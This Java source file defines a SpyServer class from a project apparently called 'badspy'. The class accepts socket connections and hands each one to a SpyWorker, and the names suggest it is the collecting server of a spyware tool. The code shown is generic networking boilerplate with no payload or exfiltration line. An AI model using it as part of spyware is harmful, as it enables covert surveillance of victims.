package com.blogspot.sontx.badspy.badserver.bo;

import com.blogspot.sontx.badspy.badserver.bo.spyworker.SpyWorker;
import com.blogspot.sontx.jlog.Log;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.LinkedList;
import java.util.List;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 20/4/2016.
 */
public class SpyServer extends Server<SpyWorker> {

    public SpyServer(String addr, int port) throws IOException {
        super(addr, port);
    }

    @Override
    protected SpyWorker createWorker(Socket socket) {
        SpyWorker worker = null;
        try {
            worker = new SpyWorker(socket);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return worker;
    }
}
